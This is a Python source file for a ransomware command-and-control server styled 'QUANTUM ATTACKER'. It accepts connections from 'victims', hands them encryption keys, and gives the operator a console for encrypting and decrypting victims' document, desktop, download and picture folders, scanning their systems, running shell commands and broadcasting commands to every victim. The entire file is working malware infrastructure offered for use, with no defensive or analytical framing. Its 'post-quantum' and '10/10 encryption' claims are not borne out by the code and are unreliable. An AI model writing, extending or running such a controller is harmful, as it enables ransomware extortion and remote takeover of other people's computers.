#!/usr/bin/env python3
"""
QUANTUM ATTACKER - 10/10 ENCRYPTION C2 SERVER
Memory-Hard KDF with Post-Quantum Resistance
"""
import socket
import sys
import time
import os
import json
import base64
import secrets
import hashlib
import threading
from queue import Queue
from datetime import datetime

# Color codes for Windows
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    """Clear screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print attacker banner"""
    clear_screen()
    print(f"""
{Colors.BOLD}{Colors.HEADER}
╔══════════════════════════════════════════════════════════════╗
║                  QUANTUM ATTACKER v1.0                       ║
║                  10/10 Encryption C2 Server                  ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
    """)

def print_status(message, color=Colors.BLUE):
    """Print status message"""
    print(f"{color}[*] {message}{Colors.END}")

def print_success(message):
    """Print success message"""
    print(f"{Colors.GREEN}[✓] {message}{Colors.END}")

def print_error(message):
    """Print error message"""
    print(f"{Colors.RED}[✗] {message}{Colors.END}")

def print_warning(message):
    """Print warning message"""
    print(f"{Colors.YELLOW}[!] {message}{Colors.END}")

class QuantumAttacker:
    """10/10 Encryption Attacker (C2 Server)"""
    
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server = None
        self.running = False
        self.victims = {}  # victim_id -> socket info
        self.keys = None
        self.command_queue = Queue()
        
        print_status(f"Initializing Quantum Attacker on {host}:{port}")
        
    def load_keys(self, key_file="quantum_keys_output/attacker_keys.json"):
        """Load quantum keys"""
        try:
            with open(key_file, 'r') as f:
                self.keys = json.load(f)
            
            print_success(f"Keys loaded from {key_file}")
            print_status(f"Security Level: {self.keys.get('security_level', 'Unknown')}")
            print_status(f"Memory-hard KDF: {self.keys.get('kdf', {}).get('algorithm', 'Unknown')}")
            
            # Decode keys
            self.master_key = base64.b64decode(self.keys["keys"]["master_key"])
            self.encryption_keys = self.keys["keys"]["encryption_keys"]
            
            return True
            
        except FileNotFoundError:
            print_error(f"Key file not found: {key_file}")
            print_status("Please run key generator first")
            return False
        except Exception as e:
            print_error(f"Error loading keys: {e}")
            return False
    
    def start_server(self):
        """Start C2 server"""
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            self.running = True
            
            print_success(f"C2 Server started on {self.host}:{self.port}")
            print_status("Waiting for quantum victims...")
            
            # Start accept thread
            accept_thread = threading.Thread(target=self._accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Start command interface
            self._command_interface()
            
        except Exception as e:
            print_error(f"Failed to start server: {e}")
            import traceback
            traceback.print_exc()
        finally:
            self.cleanup()
    
    def _accept_connections(self):
        """Accept victim connections"""
        while self.running:
            try:
                client_socket, client_addr = self.server.accept()
                victim_id = f"{client_addr[0]}:{client_addr[1]}"
                
                print_success(f"New victim connected: {victim_id}")
                
                # Store victim
                self.victims[victim_id] = {
                    "socket": client_socket,
                    "address": client_addr,
                    "connected": time.time(),
                    "session_key": None
                }
                
                # Handle victim in separate thread
                victim_thread = threading.Thread(
                    target=self._handle_victim,
                    args=(victim_id, client_socket)
                )
                victim_thread.daemon = True
                victim_thread.start()
                
            except Exception as e:
                if self.running:
                    print_error(f"Accept error: {e}")
    
    def _handle_victim(self, victim_id, client_socket):
        """Handle individual victim connection"""
        try:
            # Send handshake
            handshake = {
                "type": "handshake",
                "attacker_id": hashlib.sha256(self.master_key).hexdigest()[:16],
                "timestamp": time.time(),
                "security_level": self.keys.get("security_level", "high")
            }
            
            self._send_json(client_socket, handshake)
            
            # Receive victim response
            response = self._receive_json(client_socket, timeout=10)
            if response and response.get("type") == "handshake_response":
                print_success(f"Victim {victim_id} handshake complete")
                
                # Send encryption keys
                keys_msg = {
                    "type": "session_keys",
                    "keys": self.encryption_keys,
                    "timestamp": time.time()
                }
                self._send_json(client_socket, keys_msg)
                
                # Main loop for commands
                while self.running and victim_id in self.victims:
                    try:
                        # Check for commands from queue
                        if not self.command_queue.empty():
                            cmd_data = self.command_queue.get()
                            if cmd_data.get("victim_id") == victim_id or cmd_data.get("victim_id") == "all":
                                self._send_json(client_socket, cmd_data["command"])
                                self.command_queue.task_done()
                        
                        # Receive victim messages
                        try:
                            client_socket.settimeout(1.0)
                            data = self._receive_json(client_socket, timeout=1)
                            if data:
                                self._process_victim_response(victim_id, data)
                        except socket.timeout:
                            continue
                            
                    except Exception as e:
                        print_error(f"Error with victim {victim_id}: {e}")
                        break
                        
        except Exception as e:
            print_error(f"Victim {victim_id} handler error: {e}")
        finally:
            if victim_id in self.victims:
                del self.victims[victim_id]
            try:
                client_socket.close()
            except:
                pass
            print_warning(f"Victim {victim_id} disconnected")
    
    def _send_json(self, socket, data):
        """Send JSON data"""
        try:
            json_str = json.dumps(data)
            socket.send(json_str.encode() + b"\n")
            return True
        except Exception as e:
            print_error(f"Send error: {e}")
            return False
    
    def _receive_json(self, socket, timeout=30):
        """Receive JSON data"""
        try:
            socket.settimeout(timeout)
            data = b""
            
            while True:
                chunk = socket.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\n" in chunk:
                    break
            
            if data:
                json_str = data.decode().strip()
                return json.loads(json_str)
            
        except socket.timeout:
            return None
        except json.JSONDecodeError:
            print_error("Invalid JSON received")
            return None
        except Exception as e:
            print_error(f"Receive error: {e}")
            return None
    
    def _process_victim_response(self, victim_id, data):
        """Process response from victim"""
        msg_type = data.get("type", "unknown")
        
        if msg_type == "command_output":
            output = data.get("output", "")
            print(f"\n{Colors.BOLD}[VICTIM {victim_id}]{Colors.END}")
            print(f"{output}")
            
        elif msg_type == "encryption_result":
            success = data.get("success", False)
            count = data.get("encrypted_count", 0)
            if success:
                print_success(f"Victim {victim_id}: Encrypted {count} files")
            else:
                print_error(f"Victim {victim_id}: Encryption failed")
                
        elif msg_type == "decryption_result":
            success = data.get("success", False)
            count = data.get("decrypted_count", 0)
            if success:
                print_success(f"Victim {victim_id}: Decrypted {count} files")
            else:
                print_error(f"Victim {victim_id}: Decryption failed")
                
        elif msg_type == "scan_result":
            results = data.get("results", {})
            print(f"\n{Colors.BOLD}[SCAN {victim_id}]{Colors.END}")
            for location, info in results.get("locations", {}).items():
                print(f"  {location}: {info.get('target_files', 0)} files")
                
        elif msg_type == "status":
            status = data.get("status", {})
            print(f"\n{Colors.BOLD}[STATUS {victim_id}]{Colors.END}")
            print(f"  ID: {status.get('victim_id', 'unknown')}")
            print(f"  Keys: {'loaded' if status.get('session_keys') else 'none'}")
    
    def _command_interface(self):
        """Main command interface"""
        while self.running:
            try:
                # Show connected victims
                if self.victims:
                    print(f"\n{Colors.BOLD}Connected Victims ({len(self.victims)}):{Colors.END}")
                    for i, victim_id in enumerate(self.victims.keys(), 1):
                        print(f"  {i}. {victim_id}")
                else:
                    print(f"\n{Colors.YELLOW}No victims connected{Colors.END}")
                
                # Show menu
                print(f"\n{Colors.BOLD}Commands:{Colors.END}")
                print("  1. encrypt <victim> <location>  - Encrypt files")
                print("  2. decrypt <victim>             - Decrypt files")
                print("  3. scan <victim>                - Scan system")
                print("  4. status <victim>              - Get status")
                print("  5. shell <victim> <command>     - Execute command")
                print("  6. broadcast <command>          - Send to all")
                print("  7. list                         - List victims")
                print("  8. help                         - Show help")
                print("  9. exit                         - Exit")
                
                # Get command
                cmd_input = input(f"\n{Colors.BLUE}attacker>{Colors.END} ").strip()
                
                if not cmd_input:
                    continue
                    
                if cmd_input.lower() == "exit":
                    print_status("Shutting down...")
                    self.running = False
                    break
                    
                elif cmd_input.lower() == "help":
                    self._show_help()
                    
                elif cmd_input.lower() == "list":
                    self._list_victims()
                    
                elif cmd_input.lower().startswith("encrypt "):
                    self._handle_encrypt(cmd_input)
                    
                elif cmd_input.lower().startswith("decrypt "):
                    self._handle_decrypt(cmd_input)
                    
                elif cmd_input.lower().startswith("scan "):
                    self._handle_scan(cmd_input)
                    
                elif cmd_input.lower().startswith("status "):
                    self._handle_status(cmd_input)
                    
                elif cmd_input.lower().startswith("shell "):
                    self._handle_shell(cmd_input)
                    
                elif cmd_input.lower().startswith("broadcast "):
                    self._handle_broadcast(cmd_input)
                    
                else:
                    print_error("Unknown command. Type 'help'")
                    
            except KeyboardInterrupt:
                print_status("\nShutting down...")
                self.running = False
                break
            except Exception as e:
                print_error(f"Command error: {e}")
    
    def _handle_encrypt(self, cmd_input):
        """Handle encrypt command"""
        parts = cmd_input.split()
        if len(parts) < 3:
            print_error("Usage: encrypt <victim_id> <location>")
            print_error("Locations: all, documents, desktop, downloads, pictures")
            return
        
        victim_id = parts[1]
        location = parts[2]
        
        if victim_id not in self.victims:
            print_error(f"Victim {victim_id} not found")
            return
        
        command = {
            "type": "encrypt",
            "location": location,
            "timestamp": time.time()
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        print_status(f"Encryption command sent to {victim_id}")
    
    def _handle_decrypt(self, cmd_input):
        """Handle decrypt command"""
        parts = cmd_input.split()
        if len(parts) < 2:
            print_error("Usage: decrypt <victim_id>")
            return
        
        victim_id = parts[1]
        
        if victim_id not in self.victims:
            print_error(f"Victim {victim_id} not found")
            return
        
        command = {
            "type": "decrypt",
            "timestamp": time.time()
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        print_status(f"Decryption command sent to {victim_id}")
    
    def _handle_scan(self, cmd_input):
        """Handle scan command"""
        parts = cmd_input.split()
        if len(parts) < 2:
            print_error("Usage: scan <victim_id>")
            return
        
        victim_id = parts[1]
        
        if victim_id not in self.victims:
            print_error(f"Victim {victim_id} not found")
            return
        
        command = {
            "type": "scan",
            "timestamp": time.time()
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        print_status(f"Scan command sent to {victim_id}")
    
    def _handle_status(self, cmd_input):
        """Handle status command"""
        parts = cmd_input.split()
        if len(parts) < 2:
            print_error("Usage: status <victim_id>")
            return
        
        victim_id = parts[1]
        
        if victim_id not in self.victims:
            print_error(f"Victim {victim_id} not found")
            return
        
        command = {
            "type": "status",
            "timestamp": time.time()
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        print_status(f"Status command sent to {victim_id}")
    
    def _handle_shell(self, cmd_input):
        """Handle shell command"""
        parts = cmd_input.split(maxsplit=2)
        if len(parts) < 3:
            print_error("Usage: shell <victim_id> <command>")
            return
        
        victim_id = parts[1]
        shell_cmd = parts[2]
        
        if victim_id not in self.victims:
            print_error(f"Victim {victim_id} not found")
            return
        
        command = {
            "type": "command",
            "command": shell_cmd,
            "timestamp": time.time()
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        print_status(f"Shell command sent to {victim_id}")
    
    def _handle_broadcast(self, cmd_input):
        """Handle broadcast command"""
        parts = cmd_input.split(maxsplit=1)
        if len(parts) < 2:
            print_error("Usage: broadcast <command>")
            return
        
        shell_cmd = parts[1]
        
        if not self.victims:
            print_error("No victims connected")
            return
        
        command = {
            "type": "command",
            "command": shell_cmd,
            "timestamp": time.time()
        }
        
        for victim_id in self.victims:
            self.command_queue.put({
                "victim_id": victim_id,
                "command": command
            })
        
        print_status(f"Broadcast command sent to {len(self.victims)} victims")
    
    def _list_victims(self):
        """List connected victims"""
        if not self.victims:
            print_warning("No victims connected")
            return
        
        print(f"\n{Colors.BOLD}Connected Victims:{Colors.END}")
        for victim_id, info in self.victims.items():
            conn_time = time.time() - info["connected"]
            print(f"  {victim_id} - Connected: {conn_time:.0f}s ago")
    
    def _show_help(self):
        """Show help"""
        help_text = f"""
{Colors.BOLD}QUANTUM ATTACKER COMMANDS:{Colors.END}

{Colors.BOLD}ENCRYPTION:{Colors.END}
  encrypt <victim> <location>    Encrypt files on victim
    Locations: all, documents, desktop, downloads, pictures
    
  decrypt <victim>               Decrypt files on victim

{Colors.BOLD}SYSTEM COMMANDS:{Colors.END}
  scan <victim>                  Scan victim system
  status <victim>                Get victim status
  shell <victim> <command>       Execute shell command
  
{Colors.BOLD}BROADCAST:{Colors.END}
  broadcast <command>            Send command to all victims

{Colors.BOLD}INFO:{Colors.END}
  list                           List connected victims
  help                           Show this help
  exit                           Exit attacker

{Colors.BOLD}EXAMPLES:{Colors.END}
  encrypt 192.168.1.100:12345 documents
  decrypt 192.168.1.100:12345
  shell 192.168.1.100:12345 whoami
  broadcast ipconfig
"""
        print(help_text)
    
    def cleanup(self):
        """Cleanup resources"""
        self.running = False
        
        # Disconnect all victims
        for victim_id, info in list(self.victims.items()):
            try:
                info["socket"].close()
            except:
                pass
            del self.victims[victim_id]
        
        # Close server
        if self.server:
            try:
                self.server.close()
            except:
                pass
        
        print_status("Attacker shutdown complete")

def main():
    """Main function"""
    print_banner()
    
    # Load keys
    attacker = QuantumAttacker(host='0.0.0.0', port=5555)
    
    if not attacker.load_keys():
        print_error("Failed to load keys. Make sure keys were generated.")
        input("Press Enter to exit...")
        return
    
    # Start server
    try:
        attacker.start_server()
    except KeyboardInterrupt:
        print_status("\nShutdown by user")
    except Exception as e:
        print_error(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        attacker.cleanup()

if __name__ == "__main__":
    main()